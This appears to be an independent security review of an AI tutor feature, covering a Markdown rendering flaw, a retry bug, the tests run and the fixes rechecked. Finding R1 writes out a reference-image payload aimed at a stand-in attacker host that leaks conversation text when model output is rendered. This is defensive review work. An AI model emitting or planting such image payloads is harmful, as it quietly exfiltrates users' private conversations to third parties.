# Contextual AI Tutor V1 — independent review

Date: 2026-10-09. Reviewer: separate `tutor_independent_review` agent.
Branch: `dmitrij/feature/contextual-ai-tutor`; implementation inspected before publication.
Decision: **APPROVE** — both findings below repaired and independently rechecked. This approves the implementation for human PR review, not deployment/merge; final full-tree QA/build and publication gates remain required.

## Findings

### MAJOR R1 — RESOLVED: untrusted Tutor Markdown could trigger external image requests

Paths: `src/lib/tutor/policy.ts` (`buildTutorReply`), `src/components/tutor-panel.tsx` (message rendering), existing `src/components/markdown.tsx`.

The policy's regular expressions remove ordinary inline HTTP links but do not cover Markdown reference images with protocol-relative destinations. Tutor renders model/user messages with the general lesson RichText renderer, which allows images and links.

Independent local reproduction (no network request): pass `![diagram][img]\n\n[img]: //attacker.invalid/pixel?conversation=private-text` as a teaching message through `buildTutorReply`, then render with the same react-markdown default rendering. `renderToStaticMarkup` produced both `<img src="//attacker.invalid/pixel?conversation=private-text">` and an image preload. A browser would request that destination automatically. Model output could therefore disclose conversation fragments to an arbitrary third party or display fabricated source links.

Required repair: a Tutor-specific Markdown policy that does not render remote images or model-authored links; keep useful server-owned source links in the separate citations UI. Do not globally break trusted lesson Markdown. Add an adversarial render regression for reference images/links, protocol-relative URLs and ordinary links.

### MINOR R2 — RESOLVED: definitive rejected turns could strand the composer in retry mode

Path: `src/components/tutor-panel.tsx`, `readSnapshot` / `send` / `refresh` / `locked`.

Every failed POST leaves `retry` populated, including definitive admission failures such as 400 or 429. The composer remains disabled, and refreshing only clears retry if a matching assistant message exists. No message exists for a pre-admission rejection; new contexts also lack the reset button. The user must reload the page or retry the same rejected text. Preserve identity for ambiguous transport failures, but clear/edit a definitively rejected draft or provide a safe explicit recovery path.

## Acceptance and safety coverage inspected

- User-owned context resolution; cross-user practice item rejection; no client-supplied conversation ownership bypass.
- User-row serialized admission, idempotent request keys, leased pending turns, persistent hourly/daily quotas, provider calls outside transactions, stale completion fencing.
- User-wide active Exam/delayed-feedback/no-hints restriction, history suppression, post-provider recheck; safe exercise fields and constrained unresolved-exercise replies.
- Hidden answers/correctness/feedback maps are not selected into provider context; only already-open hints and authorized solution are exposed. No practice/mastery writes added.
- Server-only native-fetch provider adapter, bounded payload/history/provider response, timeout/error sanitization, no tools/code execution, fixed provider origin and `store:false`.
- Additive migration; existing practice/auth tables remain behaviorally unchanged; cascade ownership and request uniqueness are appropriate. No destructive migration or unsupported pgvector dependency.
- Course chunks exclude quiz answers; hashes reject stale content; subject filtering, topic/section preference, model identity and lexical fallback; deterministic source destinations.
- Contextual lesson/practice mounts, accessible dialog structure, pending/retry/history/reset flows; practice start/submit logic untouched.
- Current integration/unit/E2E test sources cover ownership, answer and Exam boundaries, races, quota/idempotency, missing credentials, stale indexing and selected UI behavior.

## Independent checks actually executed

- Git status/current branch, tracked diff and relevant untracked Tutor sources/tests inspected.
- `git diff --check`: PASS at review time.
- `PATH="$PWD/node_modules/.bin:$PATH" node_modules/.bin/tsx --test tests/tutor.test.ts`: PASS, 9/9 tests. This existing suite did not cover R1 before the review.
- Adversarial Markdown reproduction using Node/tsx + react-dom/server: **R1 reproduced**. No live model/provider call or external image request.
- Full project suites are being run separately by root/QA; this report does not claim they passed based on code inspection.

## Limitations / final verification gates

- Live provider credentials, real teaching quality, production PostgreSQL/deployment and real Telegram login are not verified by mocked provider/UI tests.
- Unresolved exercises intentionally expose five server-authored coaching prompts, not freeform adaptive explanations. This security tradeoff must be clearly described as a V1 limitation; lessons/unlocked practice support generated conversation.
- Retrieval intentionally bounds candidates (64 local / 192 related chunks); later related lessons may fall outside that window as the corpus grows. Current-context tutoring is prioritized; this is not exhaustive search.
- Streaming and conversation summarization are deferred; bounded recent history is the implemented context strategy.
- Latest-main synchronization, final complete QA evidence, commit/push and human-review PR handoff remain root's responsibility. Approval never authorizes merging.

## Recheck

- R1: inspected new `src/components/tutor-message.tsx` and its use for both user/model messages in TutorPanel. Markdown HTML is skipped, URL transformation clears every destination, and link/image components render inert text. KaTeX retains `trust:false`. Existing trusted lesson renderer is untouched. The original exploit no longer creates `<img>`, preload, navigation or requests.
- Independently ran `tsx --test tests/tutor.test.ts tests/tutor-renderer.test.ts`: **11/11 PASS**, including original reference-image exploit, inline/reference links, protocol-relative destinations, raw HTML/script, KaTeX URL commands and preserved academic formatting. Initial combined run hit sandbox IPC EPERM; approved rerun passed.
- R2: inspected typed HTTP errors and explicit definitive-rejection set (400/401/403/404/413/429). Rejected drafts become editable; ambiguous 409/5xx/network responses preserve retry identity. Inspected new browser regression asserting distinct keys for new definitive-rejection attempts and identical key across ambiguous 503/409 retries.
- UI fix owner reports `npm run test:e2e -- e2e/tutor.spec.ts`: **9/9 PASS**, including zero attacker requests and editor/retry behavior. This browser run was executed by the fix owner, not this reviewer.
- Rechecked final provider payload projection: private practice-item IDs and unnecessary local topic IDs do not leave the service; valid source IDs remain for citation provenance. Updated provider unit assertion passes.
- Root reports `git fetch origin` / `git merge origin/main` up to date at `03790cf`. No unresolved BLOCKER/MAJOR/MINOR findings remain in the reviewed implementation. Final full-suite/build evidence and commit/push/PR handoff are tracked in the QA/task documents.
